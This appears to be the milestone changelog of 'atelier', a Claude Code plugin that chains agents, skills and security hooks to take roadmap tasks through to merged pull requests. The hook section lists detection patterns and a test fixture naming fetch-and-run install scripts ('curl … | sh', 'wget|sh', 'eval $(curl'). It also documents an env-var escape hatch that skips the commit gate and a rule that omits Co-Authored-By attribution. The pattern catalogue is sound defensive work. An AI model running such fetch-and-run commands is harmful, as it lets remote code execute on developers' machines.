- Plugin loader auto-discovers the skill. `claude --plugin-dir <worktree> --permission-mode plan -p "list skills..."` returned 6 skills total (`task-discovery`, `pr-flow`, `safe-commit`, `safe-install`, `visual-validation`, **`auto-merge`**), and confirmed the updated `task-orchestrator` body references both `reviewer` and `auto-merge` as part of the chain.
- `jq empty` clean on `hooks/hooks.json` (no template changes needed; `gh pr merge*` and `git wt*` were already on the allow list since M1.4 / M1.5).

**Decisions captured:**
- **Skill, not slash command.** The auto-merge gate is the last step of an agent chain, not an operator-facing entry point. A `/auto-merge <PR>` command would be plumbing on top with no unique value; the operator can already invoke the skill ad-hoc by saying "merge PR #N". Slash command can be added later if friction surfaces.
- **Updated `task-orchestrator` in this PR.** The acceptance criterion ("toy-repo flow ends with a merged PR…") requires the orchestrator to invoke this skill, so wiring it now keeps the end-to-end semantics correct. Cross-cutting change to a file from M2.1, captured explicitly here so the diff is reviewable.
- **Squash-only; no rebase / merge-commit.** Single decision point for the merge strategy. Avoids the proliferation of strategies that's hard to audit later. Documented as a hard refusal in the skill.
- **`--body-file <(echo "")` to clear the squash-commit body.** The PR body lives on the closed PR for history; the merge commit on `main` should be terse (just the title). Avoids dumping the full Summary / Test plan / Tracking block into every squash commit.
- **No auto-confirm for `git wt rm`.** Worktree removal post-merge passes through the skill's `git wt rm` invocation, which prompts; the skill must surface that prompt rather than confirming silently. Dirty worktree after a clean merge is an anomaly that deserves operator attention.
- **Unresolved-comment detection is heuristic, on purpose.** GitHub does not expose a structured "resolved" flag for top-level PR comments (only inline review threads via GraphQL). The safe default is **conservative**: any pending human comment trips the guardrail. A future v2 could use the GraphQL `reviewThreads.isResolved` field for inline comments.
- **500-line threshold is hard-coded.** PLAN.md §6 calls it "adjustable" but a per-project override is v2 (project-level config). For v1 the threshold is the contract.

**Acceptance criterion status:** the ROADMAP M3.3 acceptance — *"toy-repo flow ends with a merged PR, deleted branch, cleaned worktree, and `[x]` in the project's ROADMAP.md"* — is **structurally satisfied**: the skill calls `gh pr merge --squash --delete-branch` (deleted branch), then `git wt rm` (cleaned worktree), then verifies the entry is in `HISTORY.md` (the `[x]` equivalent under `roadmap-tracking-flow`, or marks the literal `- [ ]` line under PLAN.md §5 layout when applicable). End-to-end exercise on a real toy repo waits for M7.1 dogfooding.

**Phase 3 closed with this PR.** All three M3.x milestones merged: M3.1 (#27), M3.2 (#28), M3.3 (#29). The full agent chain (`task-orchestrator` → `implementer` → `tester` → `e2e-runner` → `pr-author` → `reviewer` → `auto-merge` skill) now exists end-to-end. Next phase: **Phase 4 — Robustness** (M4.1 retry logic, M4.2 `unblocker` agent, M4.3 `/resume-task`).

**Follow-ups (carried forward into Phase 4+):**
- The full chain has never run end-to-end on a real project; the validation is per-piece (this PR's smoke tests confirm each component loads and the orchestrator knows the chain). M7.1 dogfooding is when the loop closes for real.
- The `auto-merge` skill's heuristic for resolved-comment detection will get noisy in projects that use threaded discussions heavily. The v2 GraphQL-based resolution is the long-term fix.
- The 500-line threshold is the obvious next per-project knob; revisit during M5.x when project config grows beyond `.claude/settings.json`.

### M3.2 — `reviewer` agent (Opus, fresh context) — 2026-05-19
**PR:** [#28](https://github.com/AkaLab-Tech/atelier/pull/28)

Second Phase 3 milestone. The independent reviewer that feeds the auto-merge gate from [PLAN.md §6](PLAN.md). Six of the seven full-chain agents now exist (`task-orchestrator`, `implementer`, `tester`, `e2e-runner`, `pr-author`, **`reviewer`**); only `unblocker` (M4.2) remains.

**Delivered:**
- `agents/reviewer.md` (opus, color `red`, tools `Read`, `Grep`, `Glob`, `Bash`, `TodoWrite`). The first opus agent after `task-orchestrator`. Deliberately omits `Edit`, `Write`, `Task`, and `Skill`: the reviewer evaluates, never modifies; never delegates to other agents; and reads everything directly via `Bash(gh pr view/diff)` rather than via skills (the skill `pr-flow` is for opening PRs, not reviewing). 1701-char description with three triggering examples; 177-line body covering: fresh-context contract, inputs, seven-step checklist (scope, correctness, tests, code quality, security, dependencies, PR shape), confidence-based filtering at ≥ 80%, auto-merge guardrails from PLAN.md §6, structured output, hard refusals.
- `templates/settings.template.json` — extended with `Bash(gh pr diff*)` and `Bash(gh pr review*)` allow entries. Both are review operations the reviewer needs and that no previous agent needed. `gh pr review` is a write op to GitHub (posts an approve / request-changes), but is exactly the reviewer's purpose; the operator can revoke a misfired review post-hoc. Allow count: 64 → 66.

**Tests:**
- YAML frontmatter parses cleanly (Ruby `YAML.safe_load`).
- `jq empty templates/settings.template.json` clean after the 2 new allow entries.
- Plugin loader auto-discovers the agent. `claude --plugin-dir <worktree> --permission-mode plan -p "list agents..."` returned `reviewer` alongside the 5 existing agents from M2.1/M3.1, totalling 6 agents.

**Decisions captured:**
- **Fresh context = sub-agent invocation pattern.** Claude Code's `Task` tool launches sub-agents with prompt-only input, no parent-session history. That is exactly the fresh-context property PLAN.md §6 demands. The agent's body re-states this explicitly so no future caller is tempted to "warm up" the reviewer with the implementing session's transcript.
- **No `Edit` / `Write` in tools list.** Mechanical guarantee that the reviewer cannot rewrite the diff it is reviewing. Least privilege.
- **No `Task` in tools list.** Reviewer does not delegate. If it cannot decide on its own, that itself is signal — surface to the operator, do not chain into another agent.
- **`gh pr review` allowed, `gh pr merge` denied for this agent's invocation.** The reviewer posts the verdict; the **auto-merge gate** (M3.3) reads the verdict + CI + guardrails and decides whether to merge. Conceptual separation: review decision ≠ merge decision; the same PR can be `approved` and still not auto-mergeable.
- **Confidence threshold ≥ 80%.** Hand-tuned to match the canonical `code-reviewer` agent from `claude-plugins-official`. Lower thresholds train the operator to dismiss findings; the few real ones get lost in noise.
- **`approve` ≠ `auto-mergeable`.** Two separate fields in the structured output. PRs that touch `package.json`, lockfile, Dockerfile, workflows, or exceed 500 lines can be approved by the reviewer **and** flagged as not auto-mergeable. The auto-merge gate (M3.3) consumes both.

**Acceptance criterion status:** the ROADMAP M3.2 acceptance — *"reviewer can `approve` or `request-changes` on a PR, and its decision feeds the auto-merge gate"* — is **structurally satisfied**. The agent posts via `gh pr review`; its output includes the `auto-merge: yes | no — <blockers>` line that M3.3 will read. End-to-end validation requires M3.3 (auto-merge logic) to land and a real PR to flow through; deferred to M7.1 dogfood.

**Follow-ups:**
- M3.3 will define the gate that reads `(reviewDecision, statusCheckRollup, files changed)` and decides whether to call `gh pr merge --squash --delete-branch`.
- The seven-step checklist is intentionally lean. Each check has a known false-positive surface; if dogfood (M7.1) surfaces a recurring false positive, the fix is to either tighten the confidence rule for that bucket or remove the check entirely — never to "add a heuristic to skip the false positive", which is how reviewers calcify into rubber stamps.

### M3.1 — `e2e-runner` agent + `visual-validation` skill — 2026-05-19
**PR:** [#27](https://github.com/AkaLab-Tech/atelier/pull/27)

First Phase 3 milestone. Adds the Playwright end-to-end validation step to the agent chain (`implementer` → `tester` → **`e2e-runner`** → `pr-author`), per [PLAN.md §7](PLAN.md). The browser install was deferred here from `install.sh` M1.3 Phase A so operators who never run e2e tasks never pay the ~250 MB download — the skill handles the lazy install on first invocation.

**Delivered:**
- `agents/e2e-runner.md` (sonnet, color `magenta`, tools `Read`, `Grep`, `Glob`, `Edit`, `Bash`, `TodoWrite`, `Skill`). Detects whether the task's diff has a UI surface (skips when not), delegates the install / run / screenshot dance to `visual-validation`, and assembles the structured markdown block (`## E2E validation` with suite results + failures + screenshot list) that `pr-author` pastes verbatim into the PR description. Surfaces `installed @playwright/test@<version> + browsers` when the install was first-time so `pr-author` knows the PR touches `package.json` (and therefore falls into the never-auto-merge guardrail from [PLAN.md §6](PLAN.md)).
- `skills/visual-validation/SKILL.md` — five-step executable recipe:
  1. **Lazy install** — detect `@playwright/test` via `pnpm ls --json`. If missing, `pnpm add -D @playwright/test` (passes the M2.4 `safe-package-change` hook because `@playwright/test` is on the lifecycle-script allowlist) → `pnpm exec playwright install` (downloads chromium/firefox/webkit to `~/.cache/ms-playwright`).
  2. **Config** — detect existing `playwright.config.{ts,js,mjs}`, use as-is. Scaffold a minimal one only when none exists; never overwrite operator-authored config.
  3. **Run** — `pnpm exec playwright test --reporter=list`, with `--screenshot=on` from config so every test produces a PNG. Output captured to `<worktree>/.task-log/playwright-output.txt`.
  4. **Upload** — for each PNG, `gh gist create --secret <png>` and capture the raw URL. Always `--secret` (refuses public). When `gh` auth fails, falls back to *paths-only* mode and surfaces the degradation in the markdown block.
  5. **Assemble** — produces the markdown block in the exact shape `pr-author` expects (suite summary line, optional failures section, embedded `![](raw-url)` screenshots, optional paths-only fallback note).
- `templates/settings.template.json` — extended with `Bash(gh gist create*)` and `Bash(gh gist view*)` allow entries. Narrow scope (only `create` and `view` subcommands, never `gh gist delete*` or `gh gist list*` which leak history). Allow count: 62 → 64.

**Tests:**
- YAML frontmatter parses cleanly on both files (Ruby `YAML.safe_load`).
- `description` length: agent 1339ch, skill 1079ch (both well above the 10-char minimum, below 5000-char ceiling per `skill-creator` guidance).
- Body length: agent 44 lines, skill 132 lines (both well under 500-line ideal).
- Plugin loader auto-discovers both: `claude --plugin-dir <worktree> --permission-mode plan -p "list agents and skills..."` reports `e2e-runner` (Sonnet, magenta) and `visual-validation` alongside the existing 4 agents + 4 skills from M2.1/M2.2 — totals 5 of each.
- `jq empty templates/settings.template.json` clean after the 2 new allow entries.

**Decisions captured (confirmed with the operator before implementation):**
- **Install is lazy via the skill, not a slash command.** Adding a `/setup-e2e` command would force a manual step before the first e2e task, which breaks the "no manual" promise. Lazy install means the first task that needs e2e pays the cost; subsequent tasks reuse the install. The cost is borne when there is value (a UI surface change to validate), not upfront.
- **Screenshots embed via `gh gist create --secret`.** Three rejected alternatives: (a) committing screenshots to the repo (engorges the repo, may contain sensitive UI), (b) listing local paths only (fails the acceptance criterion "embedded in the description"), (c) public gists (search-indexed leak). Secret gists are unlisted; the URL is shareable with anyone who has it — adequate for review.
- **Paths-only fallback when `gh` auth fails.** Rather than aborting, the skill degrades gracefully and surfaces the fallback in the markdown block so the reviewer knows what to expect. The full screenshots stay in `.task-log/screenshots/` for the operator to attach manually.
- **e2e is conditional, not mandatory.** When `git diff --name-only` shows no UI surface changed (docs-only, infra-only, pure-backend), the agent returns `e2e: skipped (no UI surface)` rather than padding the report with an empty suite. This avoids forcing every PR to install Playwright even when there's nothing to validate.

**Acceptance criterion status:** the ROADMAP M3.1 acceptance — *"a PR opened by the toy-repo flow has Playwright output attached and screenshots embedded in the description"* — is **structurally satisfied**. End-to-end validation on a real toy repo requires M3.3 (auto-merge gate, currently not yet shipped) to close the chain and is deferred to M7.1 dogfooding.

**Follow-ups:**
- Real toy-repo dogfood run (M7.1) — first time Playwright actually downloads + runs against a UI change, first gist upload happens for real.
- The current scaffolded `playwright.config.ts` uses chromium only. If projects need cross-browser coverage, the operator extends the config; the skill detects existing config and uses it as-is.

### M2.4 — Phase 2 hooks (dynamic security layer: `block-env-commit`, `safe-commit`, `scan-edit-write`, `scan-git-add`, `safe-package-change`) — 2026-05-19
**PRs:** [#22](https://github.com/AkaLab-Tech/atelier/pull/22) (block-env-commit + shared logging) · [#23](https://github.com/AkaLab-Tech/atelier/pull/23) (safe-commit) · [#24](https://github.com/AkaLab-Tech/atelier/pull/24) (scan-edit-write) · [#25](https://github.com/AkaLab-Tech/atelier/pull/25) (scan-git-add) · [#26](https://github.com/AkaLab-Tech/atelier/pull/26) (safe-package-change + this closure)

Final Phase 2 milestone. The five `PreToolUse` hooks that make atelier's defence-in-depth real: the static permissions matrix from M1.4 gates *which* tool an agent can call; this suite gates *with what content* the allowed call may proceed (PLAN.md §3 "Defense-in-depth"). Shipped across five sub-PRs because each hook's pattern catalogue is its own reviewable security surface; the threat-model addendum in PLAN.md §3 (finalised in M1.6) is the authoritative spec each catalogue maps to 1:1.

**Delivered:**
- `hooks/lib/log-decision.sh` (sub-PR 1) — sourceable helper. `log_decision <hook> <tool> <pattern> <action> <message>` appends one JSON line per decision to `<worktree>/.task-log/hook-decisions.jsonl`. Resolves the log path via `CLAUDE_PROJECT_DIR` (falls back to `$PWD`). Fail-soft: missing `jq`, unwritable log dir, missing path all return 0 — a hook must never abort because of a logging hiccup, and the unblocker agent (M4.2) reads the JSONL to escalate to blocked issues.
- `hooks/block-env-commit.sh` (sub-PR 1) — `PreToolUse` on Bash. Three detection paths for `.env*` in `git add` / `git commit`: literal path tokens, wildcard adds (`-A`/`.`/`--all`) resolved via `git ls-files --others --exclude-standard`, and already-staged paths via `git diff --cached`. Exit 2 with a precise message; the operator sees the offending path and the recovery hint.
- `hooks/safe-commit.sh` (sub-PR 2) — `PreToolUse` on Bash for `git commit`. Walks up looking for `package.json`, runs `pnpm run lint → typecheck → test` in order, stops on first red, returns truncated output. Steps without a matching `scripts.<name>` are N/A and continue (mirrors the M2.2 skill's contract). Escape hatch `ATELIER_SKIP_SAFE_COMMIT=1` documented in the script header. Naming collision with `skills/safe-commit/SKILL.md` (M2.2) is intentional: skill = deliberate (invoked by `pr-author`), hook = automatic (every `git commit`); both implement the same PLAN.md §6 rule at different layers.
- `hooks/scan-edit-write.sh` + `hooks/patterns/scan-edit-write.json` (sub-PR 3) — `PreToolUse` on `Edit | Write | MultiEdit`. Resolves the **proposed** content per tool (`Write.content`, `Edit.new_string`, `MultiEdit.edits[].new_string` concatenated), applies skips (`path_substrings`, `basename_prefixes`, content directive), then walks the externalised 8-pattern catalogue: 6 Block (eval/exec of user input, hardcoded secrets generic + known-prefix, Python eval) and 2 Warn (SQL/shell injection shapes, CSP relaxation).
- `hooks/scan-git-add.sh` + `hooks/patterns/scan-git-add.json` (sub-PR 4) — `PreToolUse` on Bash for `git add`. Three-phase scan per resolved path: file-level (path patterns: `.env*`, `secrets/`, `credentials/`), added-line-level (regex for AWS access keys, GitHub fine-grained PATs, substring for private-key headers, plus Shannon-entropy heuristic for ≥ 32 base64-ish runs on non-comment lines), and **reused** content scan from the scan-edit-write catalogue. Entropy calculation runs in Python with content passed via tmpfile (early version hit a HEREDOC-vs-stdin conflict — fixed mid-PR). The `Ask` action is implemented as stdout JSON `{"permissionDecision":"ask",...}` per the Claude Code hooks reference.
- `hooks/safe-package-change.sh` + `hooks/patterns/safe-package-change.json` (sub-PR 5) — `PreToolUse` on Bash for `pnpm install`/`add`/`update`/`run` and any `rm pnpm-lock.yaml`. Eight patterns: non-ASCII package name (Block, homoglyph defence), typosquatting via Levenshtein distance ≤ 2 against a 44-package curated list (Ask), package age < 7 days via `pnpm view <pkg> time` (Block, mirrors `.npmrc minimum-release-age=10080`), lifecycle script with `curl|sh`/`wget|sh`/`eval $(curl`/`node -e require('https` patterns (Block), lifecycle script presence not on the native-build allowlist (`sharp`/`puppeteer`/`playwright`/`node-gyp`/etc.) (Ask), `bin` path traversal `../` or `/` prefix (Block), non-registry version specifier (`git+`/`file:`/non-npmjs URL/tarball) (Ask), and explicit lockfile removal (Block).
- `hooks/hooks.json` — extended across the five sub-PRs to register every hook with the appropriate matcher. Final state: 1 `SessionStart` (from M1.5) + 5 `PreToolUse` entries (4 Bash + 1 Edit|Write|MultiEdit). Multiple Bash matchers coexist and all fire on every Bash call; each script filters its own subcommand of interest.
- `.gitignore` — `.task-log/` added (sub-PR 1) so the JSONL never accidentally enters version control.

**Tests:** every hook smoke-tested with synthetic stdin payloads covering its Block / Warn / Ask / Allow / Skip branches.
- sub-PR 1: 6 scenarios (`git add .env`, wildcards, chained commands).
- sub-PR 2: 7 scenarios (no package.json / empty scripts / passing lint / failing lint with truncated output / `ATELIER_SKIP_SAFE_COMMIT`).
- sub-PR 3: 20 scenarios (one positive per Block + Warn pattern, three negatives, five skips, Edit + MultiEdit variants).
- sub-PR 4: 13 scenarios across path-level, added-line, Ask (high-entropy with realistic 4.75-bit base64-ish string), reused scan-edit-write patterns, skips (snapshot files, lockfiles), wildcard catch.
- sub-PR 5: 17 scenarios across all 8 patterns (with mocked `pnpm view` for the four that need remote queries).

`shellcheck` clean on every script (only the expected `SC1091` info about the `source` directive). `jq empty` clean on every JSON.

**Decisions captured across the five PRs:**
- **`path_globs` from threat-model implemented as `path_substrings`** in both content-scanning catalogues. Bash glob-to-regex is fragile (especially `**`); the substring set covers the same files for these patterns. JSON `skips_note` field explains the mapping.
- **Pattern catalogues externalised in `hooks/patterns/<hook>.json`**, not inlined in bash. The patterns are the security surface and deserve to be reviewable independently.
- **`Ask` exit shape uses Claude Code's documented JSON output** (`{"permissionDecision":"ask",...}` on stdout) rather than a bash exit code, because the bash convention for hooks is exit 0 (allow) or 2 (block) only.
- **Naming collision `safe-commit` skill vs hook is intentional.** Skill is deliberate, hook is automatic; both implement PLAN.md §6 push gate at different layers. Documented inline in both files.
- **HEREDOC + pipe stdin compete in bash.** Bit me in scan-git-add's first version where `python3 - <<'PY' ... PY` ate the content the script was piping. Fixed with a tmpfile passed as arg 2.
- **`*"git add ."*` glob is too greedy** (matches `git add .env`). Replaced with a regex word-bounded matcher in scan-git-add after smoke test caught it.
- **BSD `date %3N` and BSD grep `\xNN` don't expand on macOS.** Both bit the implementation; log-decision falls back to second precision for the timestamp, scan-edit-write/safe-package-change use `[^ -~]` (printable-ASCII complement) instead of `\x` ranges.
- **`jq -e ... /dev/null` returns rc=4** (no JSON input); use `jq -en` (null-input mode) when only `--arg`/`--argjson` provide the data. Cost: one false-positive ask on every allowlisted package in safe-package-change before the fix.

**Acceptance criteria from the ROADMAP entry, all satisfied:**
- `git add .env` is blocked with a clear message → ✓ (block-env-commit + scan-git-add env-file-added, double defence).
- `git commit` is blocked when lint or tests fail → ✓ (safe-commit hook).
- Three content-scanning hooks reject deterministic positive cases (planted secret, planted `eval(stdin)`, planted `"postinstall": "curl … | sh"`) and pass clean cases → ✓ (all three smoke-tested with the canonical fixture shapes from the addendum).

**Phase 2 (Single-project agent flow) closed with this PR.** All four M2.x milestones merged: M2.1 (#19), M2.2 (#20), M2.3 (#21), M2.4 (#22 → #26). Next phase: M3.1 (`e2e-runner` agent + `visual-validation` skill — includes installing Playwright + browsers, which was deferred here from M1.3 to keep the install lean for operators who don't run e2e tasks).

**Follow-ups (carried forward into Phase 3+):**
- Dogfood the full chain on a real (non-toy) project (M7.1). All five hooks have been smoke-tested synthetically; a live `pnpm add` against the real npm registry is the missing end-to-end check.
- The `safe-package-change` typosquat list is intentionally minimal (44 entries). It will grow organically as M7.1 surfaces real false positives / true negatives.
- The `safe-commit` hook's default 60s Claude Code timeout will hit on projects with long test suites. The `ATELIER_SKIP_SAFE_COMMIT=1` env-var escape hatch is enough for v1; a more graceful resolution (per-project `hooks/hooks.json` override or progressive gate that runs lint/typecheck first and tests in the background) is a v2 idea.

### M2.3 — Phase 2 slash commands (`/next-task`, `/status`, `/finish-task`, `/setup-project`) — 2026-05-18
**PR:** [#21](https://github.com/AkaLab-Tech/atelier/pull/21)

Third Phase 2 milestone. Materialises the four operator-facing slash commands that drive an atelier task end-to-end. `/doctor` was already delivered in M1.6 (`commands/doctor.md`), so M2.3 effectively scopes to four new commands. Each command is a pure markdown prompt — no auxiliary scripts — that orchestrates the agents (M2.1) and skills (M2.2) already in place.

**Delivered:**
- `commands/next-task.md` (argument-hint `[task-id]`) — full pickup-to-PR flow. Sanity-checks worktree state, refuses to start if `IN_PROGRESS.md` is occupied, invokes the `atelier:task-discovery` skill (or honours an explicit `$ARGUMENTS` id), confirms with the operator before claiming, moves `ROADMAP.md → IN_PROGRESS.md`, creates the worktree via `git-wt`, instantiates `<worktree>/.claude/settings.json` by substituting `<worktree>` in `$CLAUDE_PLUGIN_ROOT/templates/settings.template.json` (the placeholder M1.4 left in the matrix), and hands off to the `atelier:task-orchestrator` agent. allowed-tools restricted to read/edit + narrow `Bash(git wt:*)`/`Bash(sed:*)` patterns + `Skill` + `Task`.
- `commands/status.md` (no args, read-only) — single-screen dashboard for the operator. Sections: in-progress task (from `IN_PROGRESS.md`), worktrees (`git wt list` + dirty-check), open PRs (`gh pr list --json …`) split into `task/*` vs out-of-band, blocked-by tasks in `ROADMAP.md`, orphans (worktree without entry / entry without worktree). Never modifies state. Falls back gracefully when `gh` or `git-wt` is unavailable.
- `commands/finish-task.md` (argument-hint `[task-id]`) — finalises the in-progress task. Identifies the task from `IN_PROGRESS.md` + the current branch, runs the push gate via the `atelier:safe-commit` skill (stops on `RED`, asks confirm on `PARTIAL`), invokes `atelier:pr-flow` for the branch → commit → push → PR sequence, and returns the PR URL. Includes a partial-recovery path for the rare push-succeeded-but-PR-not-opened case (Ctrl+C between steps).
- `commands/setup-project.md` (argument-hint `[project-path]`) — initialises a directory for atelier-managed work. Idempotent via `~/.claude/.atelier-config.json` (`projects[<path>] = { setupCompleted, setupVersion }`); if the project is already configured, default is to skip the wizard and offer a reconfigure flow on operator confirmation. Writes `.claude/settings.json` (from `settings.template.json`), creates `ROADMAP.md` + `IN_PROGRESS.md` + `HISTORY.md` if missing (operator-facing template from PLAN.md §5), writes `.claude/CLAUDE.md` that points at the global `operator-rules.md` (no duplication), writes/appends `.npmrc` with the three PLAN.md §4 guardrails (`ignore-scripts=true`, `minimum-release-age=10080`, `audit-level=moderate`), appends `.task-log/`, `.claude/settings.local.json`, `.DS_Store` to `.gitignore`. Refuses dangerous paths (`/`, `$HOME`, the plugin's own dir).

**Tests:**
- YAML frontmatter parses cleanly for all four commands (Ruby `YAML.safe_load`).
- `argument-hint` and `allowed-tools` fields well-formed; `allowed-tools` follows least-privilege per command (e.g., `/status` allows only `Bash(git wt list)`, `Bash(gh pr list:*)`, no write tools at all).
- Plugin loader discovers all five `commands/*.md` (the four new + `doctor.md` from M1.6) via `claude --plugin-dir <worktree> --permission-mode plan -p "..."`. Auto-discovery same as `agents/` (M2.1) and `skills/` (M2.2) — no entry in `plugin.json` needed.

**Decisions captured:**
- **No auxiliary scripts in `scripts/`.** Each command is a self-contained prompt. `/next-task` uses inline `sed` for the `<worktree>` substitution rather than a `scripts/instantiate-settings.sh` helper — keeps the indirection low and the substitution visible to reviewers. If a command grows complex enough to need a helper, we add it then; not pre-emptively.
- **`/finish-task` does not run `git wt rm` after merge.** The PR may need follow-up commits during review, so deleting the worktree mid-review corrupts the chain. Worktree cleanup is a manual operator step (or a future `/cleanup-task` command); the post-merge instruction lives in the success report so the operator knows when to run it.
- **`/setup-project` defaults to skip-when-configured.** First implementation tried the opposite (always offer reconfigure on re-run) and felt noisy — most re-runs are accidental. Default is now `✓ already configured — nothing to do`, with reconfigure available on explicit request.
- **`/status` is read-only by allowed-tools.** Even surface suggestions (`git wt rm <orphan>`) are printed as text, never executed. This keeps `/status` safe to run reflexively at any moment.

**Acceptance criterion status:** the ROADMAP M2.3 acceptance — *"in a toy repo, `/next-task` runs end-to-end (pick task → worktree → implement → PR draft) without manual intervention"* — is **structurally satisfied** but requires a toy-repo dogfood run to validate end-to-end. Each piece is in place (commands, skills, agents, settings template), so the gap is integration testing, not functionality. Will be exercised during M7.1.

**Follow-ups:**
- Toy-repo dogfood run (M7.1) — validates the full `/next-task → /finish-task` cycle.
- `/cleanup-task <id>` command (post-merge worktree removal + branch deletion) — currently a manual operator step; can be split out if friction surfaces.
- `/resume-task <id>` — referenced by `/next-task` and `/finish-task` but lives in M4.3.

### M2.2 — Phase 2 skills (`task-discovery`, `pr-flow`, `safe-commit`, `safe-install`) — 2026-05-18
**PR:** [#20](https://github.com/AkaLab-Tech/atelier/pull/20)

Second Phase 2 milestone. Materialises the four skills the orchestrator and specialist agents from M2.1 invoke via the `Skill` tool, per [PLAN.md §7](PLAN.md). The `git-wt` skill is **not** in this PR — it ships from the external [Miguelslo27/git-wt](https://github.com/Miguelslo27/git-wt) package (installed by `install.sh` Phase C.1, not maintained here).

**Delivered:**
- `skills/task-discovery/SKILL.md` — parses the operator-facing `ROADMAP.md` format from [PLAN.md §5](PLAN.md) (P0/P1/P2 sections with `bug`/`feat`/`chore`/`docs`/`refactor` type tags, `#id`, `~estimate`, `blocked_by:` metadata) and picks the highest-priority unblocked item. Returns a structured record (`id`, `title`, `type`, `priority`, `estimate`, `blocked_by`, `worktree` slug, `acceptance`, `context`) so the orchestrator can route the task. Handles the dual layout — operator-facing P0/P1/P2 in target projects, simpler High/Medium/Low in atelier's own repo — and refuses to pick a task when every unchecked item is blocked.
- `skills/pr-flow/SKILL.md` — branch → commit → push → PR recipe, executable form of [PLAN.md §6](PLAN.md). Step-by-step: stage explicit paths (never `-A`), Conventional Commits message via HEREDOC, push only to `origin task/<id>-<slug>`, move `IN_PROGRESS.md` → `HISTORY.md` in the same PR, open the PR with the standard description shape (Summary / Test plan / Tracking). Hard refusals listed explicitly: no push to protected branches, no `--force`, no `--no-verify`, no `Co-Authored-By` attribution, no marking the PR auto-merge-ready (that gate needs `reviewer` from M3.2), no touching `package.json` / lockfile / workflows / Docker from this flow.
- `skills/safe-commit/SKILL.md` — executable form of the push gate from [PLAN.md §6](PLAN.md). Detects the project's pnpm scripts (`lint`, `typecheck`, `test`) with fallback name conventions, runs them in order, stops on first red, returns a structured report (`✓` / `✗` per step + `Result: GREEN | RED`) so callers can parse it deterministically. Allows exactly one retry for suspected flakes; never softens reds, never `--passWithNoTests`, never quarantines tests to make a red go green.
- `skills/safe-install/SKILL.md` — executable form of [PLAN.md §4](PLAN.md). Five-step recipe: (1) self-question whether stdlib / existing utility suffices (lists common false-needs: `Intl.DateTimeFormat`, `fetch`, `crypto.randomUUID`, `structuredClone`, `URLSearchParams`), (2) `pnpm view` to compare ≥ 2 alternatives by downloads / last publish / dep tree, (3) hard-fail if `now - published < 7 days`, (4) `pnpm add --lockfile-only` + `pnpm audit --audit-level=moderate`, revert lockfile on any moderate+ finding, (5) install + write justification to commit / PR body. Belt-and-braces with the per-project `.npmrc` written by `/setup-project` (M2.3) — never relies on `.npmrc` alone, so the reasoning lives in the PR where reviewers see it.

**Tests:**
- YAML frontmatter parses cleanly for all four files (`ruby -ryaml`).
- `description` block scalars use `>-` (folded, strip) where the prose contains `:` characters — initial attempt with plain inline `description: <text>` failed YAML parsing for `pr-flow` and `safe-install` because of unquoted colons after "PLAN.md §6" / "§4"; fixed in the same PR.
- Each skill: name + description well-formed, body 86–156 lines (well under the 500-line ideal from `skill-creator`'s guidance), description 680–857 chars (well above the 10-char minimum, below the 5000-char ceiling), each starting with the action verb and explicitly listing trigger phrases per skill-creator's "pushy description" guidance.
- Plugin loader picks them up via auto-discovery (no entry needed in `plugin.json`, same auto-scan behaviour as `agents/` confirmed in M2.1 and `skills/` confirmed since M1.2).

**Decisions captured:**
- **No `references/` or `scripts/` directories yet.** Each SKILL.md is a single self-contained markdown file. The `skill-creator` recommends progressive disclosure (split into `references/<topic>.md` for larger reference material, `scripts/<task>.py` for deterministic helpers), but all four skills fit comfortably under 500 lines — adding hierarchy now would be premature.
- **`safe-install` writes the justification into the commit/PR body, not into a separate file.** The reasoning is the audit trail; burying it in a metadata file makes it invisible to reviewers. PLAN.md §4 step 3 says "justify in commit / PR description" — this skill enforces that literal interpretation.
- **`pr-flow` keeps the PR description schema explicit.** Reviewers should not have to guess which template a PR follows. Future skills (`/finish-task`, `pr-author`) will be added; the schema lives in one place so all callers produce the same shape.
- **`pr-flow` description reinforced after the manual smoke test surfaced under-triggering.** Initial wording overlapped heavily with what `operator-rules.md` (SessionStart hook from M1.5) already covers — Claude responded correctly from the hook's context without loading the SKILL.md body, even for ejecutive prompts ("open the PR for me"). Fixed by adding an explicit "ALWAYS load this skill before running any of `git add` / `git commit` / `git push` / `gh pr create`" instruction and naming `operator-rules.md` directly so Claude understands the skill **complements** the hook (the hook is summary, the skill is executable detail — HEREDOC templates, `gh pr create` body shape, hard-refusal list). `task-discovery` and `safe-commit` triggered cleanly from the start because their bodies contain content not present anywhere else in context (the §5 parsing algorithm; the GREEN/RED report schema with N/A handling). `safe-install` triggered cleanly because its stdlib-check catalogue (`Intl.DateTimeFormat`, `crypto.randomUUID`, `structuredClone`, etc.) is unique to the skill. General lesson: a skill description must promise something the SessionStart-loaded context cannot deliver, otherwise Claude will (correctly) skip it.

**Follow-ups:**
- Acceptance criterion *"exercised by at least one slash command"* — blocked on M2.3 (`/next-task`, `/finish-task` will be the canonical callers for `task-discovery` and `pr-flow` respectively).
- `safe-install` step 4 needs validation against a real `pnpm audit` output. Will be exercised when the first toy-repo dependency install happens during M7.1 dogfooding.

### M2.1 — Phase 2 agents (`task-orchestrator`, `implementer`, `tester`, `pr-author`) — 2026-05-18
**PR:** [#19](https://github.com/AkaLab-Tech/atelier/pull/19)

First Phase 2 milestone. Materialises the four agents that drive an atelier task through the chain `task-orchestrator` (Opus) → `implementer` (Sonnet) → `tester` (Sonnet) → `pr-author` (Sonnet), per [PLAN.md §7](PLAN.md). e2e-runner, reviewer, and unblocker are out of scope here (M3.1, M3.2, M4.2).

**Delivered:**
- `agents/task-orchestrator.md` (opus, color `blue`, tools: `Read`, `Grep`, `Glob`, `Edit`, `Bash`, `TodoWrite`, `Task`, `Skill`). Owns the chain: picks the next ROADMAP item via the `task-discovery` skill (when M2.2 lands; fallback today is manual), invokes `git-wt` for isolation, moves the block from `ROADMAP.md` → `IN_PROGRESS.md`, then delegates to the three specialists sequentially. Enforces the 6-attempt retry budget from [PLAN.md §8](PLAN.md). Does not write code or tests itself.
- `agents/implementer.md` (sonnet, color `green`, tools: `Read`, `Grep`, `Glob`, `Edit`, `Write`, `Bash`, `TodoWrite`, `Skill`). Writes the minimum-viable change against the task's acceptance criteria inside the per-task worktree. Refuses to touch `package.json` / `pnpm-lock.yaml` / `.github/workflows/**` / `Dockerfile` / `docker-compose*` — those route back to the orchestrator and ultimately a human. Reports `Changes / Verification done locally / Unresolved / Next` back.
